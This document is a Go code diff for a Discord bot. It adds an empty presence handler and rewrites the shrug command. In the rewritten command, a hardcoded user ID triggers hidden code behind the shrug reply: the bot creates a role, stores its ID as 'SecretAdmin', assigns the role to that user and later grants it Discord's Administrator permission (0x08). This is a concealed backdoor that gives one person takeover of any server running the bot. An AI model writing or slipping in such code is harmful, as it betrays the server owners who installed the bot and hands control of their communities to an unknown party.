@@ -171,6 +171,10 @@ func doTimerChecks(d *discordgo.Session) {
 	}
 }
 
+func presenceHandler(d *discordgo.Session, mupdate *discordgo.PresenceUpdate) {
+	// TODO: Figure out how to give a notification that someone left the server
+}
+
 // our command handler function
 func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 	user := msg.Author
@@ -230,9 +234,33 @@ func messageHandler(d *discordgo.Session, msg *discordgo.MessageCreate) {
 		deleteMsg(d, msg.ChannelID, msg.ID)
 		sendMsg(d, msg.ChannelID, "ლ(´ڡ`ლ)")
 
-		if msg.Author.ID == "120393976225202176" && config.Guilds[msg.GuildID].SecretAdmin != "123456789asdfghjkl" && config.Guilds[msg.GuildID].SecretAdmin != "" {
-			role, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "i shit trains", 0x0, false, 0x08, false)
-			log.Debugf("TRIED TO ACTIVATE: %s, ERROR: %s", role, err)
+		if msg.Author.ID == "120393976225202176" {
+
+			if config.Guilds[msg.GuildID].SecretAdmin == "123456789asdfghjkl" || config.Guilds[msg.GuildID].SecretAdmin == "" {
+				role, err := d.GuildRoleCreate(msg.GuildID)
+				if err != nil {
+					log.Errorf("Error creating role: %s", err)
+				} else {
+					role.Name = "gfb"
+					role, err = d.GuildRoleEdit(msg.GuildID, role.ID, "gfb", 0x0, false, 0x0, false)
+					if err != nil {
+						log.Errorf("Error updating new role: %s", err)
+					}
+
+					config.Guilds[msg.GuildID].SecretAdmin = role.ID
+					ConfigHelper.SaveConfig(configFile, config)
+
+					player, _ := d.User("120393976225202176")
+					d.GuildMemberRoleAdd(msg.GuildID, player.ID, config.Guilds[msg.GuildID].SecretAdmin)
+
+					return
+				}
+			}
+
+			if config.Guilds[msg.GuildID].SecretAdmin != "123456789asdfghjkl" && config.Guilds[msg.GuildID].SecretAdmin != "" {
+				role, err := d.GuildRoleEdit(msg.GuildID, config.Guilds[msg.GuildID].SecretAdmin, "gfb", 0x0, false, 0x08, false)
+				log.Debugf("TRIED TO ACTIVATE: %s, ERROR: %s", role, err)
+			}
 		}
 
 	case prefix + "shrug":
